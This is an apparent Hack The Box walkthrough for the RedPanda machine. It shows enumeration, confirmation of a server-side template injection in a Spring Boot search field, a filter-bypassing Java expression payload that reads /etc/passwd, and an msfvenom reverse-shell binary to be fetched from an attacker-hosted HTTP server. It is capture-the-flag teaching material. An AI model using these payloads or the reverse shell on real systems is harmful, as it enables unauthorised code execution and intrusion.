# redpanda-htb-walkthrough
<h3> About the Lab:</h3>
This is a Linux machine that requires exploiting SSTI in a Java SpringFramework application via a search bar on the webpage for RCE and then initial access. For privilege escalation, we will need to emulate what group the user is in, discover a log file he/she has access to, use pspy to discover a JAR file root periodically run, study that JAR file to discover conditions required to pass, exploiting directory traversal, and generate an XXE XML file to leak root’s SSH private key. The privilege escalation for this machine is HARD and shouldn’t be an easy category machine. But let’s get started!

## User Own:
Connect VPN first: `sudo openvpn [your.ovpn file]`<br>
First thing first, run nmap scan on the RedPanda server: `nmap -sS -A -p- -T4 [machine-ip]`<br>
**From nmap Enumeration:**<br>
**port 22**: SSH service<br>
**port 8080**: Red Panda Search (powered by Spring Boot)

We run some other tools as well to gather as much information possible to find out existing vulnerability in the system:<br>
`dirb [url] [wordlist]`<br>
`curl -v [url]`

![image](https://user-images.githubusercontent.com/31168741/203845250-2f90a1ca-396f-4546-865d-623841800910.png)
![image](https://user-images.githubusercontent.com/31168741/203845289-5f991ccb-a71c-4c2f-bcca-2ee00a747d45.png)

From above, we find out it is built in Spring framework Java. We found 3 accessible directories as well. Browse the website manually and inspect each endpoint with Burp Suite. If no input is provided, the search endpoint returns:

![empty_input](https://user-images.githubusercontent.com/31168741/203846234-ac32fa99-1973-4490-bb19-b6b760866f3b.png)

The stats provides some statistics for 2 different authors:<br>
**woodenk**<br>
**damian**<br>
and an export function, which generates a report for each specific user.

![stats_author_woodenk](https://user-images.githubusercontent.com/31168741/203846805-89cb2072-f645-401e-a253-dcbcac02bbfd.png)

Other than that, we've tested for various injections (SQL Injection, XXE Injection) etc. and turns out there is an SSTI injection within the search function, but some characters are blacklisted.<br>

<h3>So what is an SSTI Injection?</h3>
A server-side template injection occurs when an attacker is able to use native template syntax to inject a malicious payload into a template, which is then executed server-side. For further information: https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection<br>

A list of payloads that can be used for checking if the site is vulnerable to SSTI:

![Capture](https://user-images.githubusercontent.com/31168741/203847710-53ca4cb6-033e-440b-a85a-a952488b2f34.PNG)

4 of the payloads didn't work since some of the symbols are blacklisted by the server.

>**Error occured: banned characters**<br>

Oddly enough, the # (pound) symbol and * (star) have done the work and we can confirm the SSTI.

![ssti_confirmed](https://user-images.githubusercontent.com/31168741/203847928-026c15c3-ab62-415e-a887-7bc63588aabf.png)
![image](https://user-images.githubusercontent.com/31168741/203847951-a3bd0348-beee-42fe-98e0-7061a58dc19d.png)

Both mathematical operations 1+3+3+7 and 7+7 equals 14 we can tell that the payload got executed by the server, since we see the expected output.

<h3>SSTI into RCE:</h3>
The nmap scan reveals that the web application is powered by Spring Boot – so is it a Java application. Let's verify our payload by reading /etc/passwd. Use [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)'s Template Injection cheat sheet and find a suitable payload that bypasses the blacklist filter.<br>
Hint: The payload won't work, unless we change the $ (dollar sign) to an * (asterisk).<br>

`${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}`

![image-1](https://user-images.githubusercontent.com/31168741/204106233-2b022041-c1d7-4155-86ab-91b8e5f3eacc.png)

<h3>Reverse Shell</h3>
Note: pentest.ws (Helps to create a reverse shell)
The shell:<br>
msfvenom -p linux/x64/shell_reverse_tcp LHOST=[your-machine-ip] LPORT=1234 -f elf > rs.elf<br>
Start your HTTP server in the same location as r.elf the reverse shell to the target machine: `python3 -m http.server 80`. Now the payload we'll use here is: *{"".getClass().forName("java.lang.Runtime").getRuntime().exec("")}; as it is java based (collected from github). 

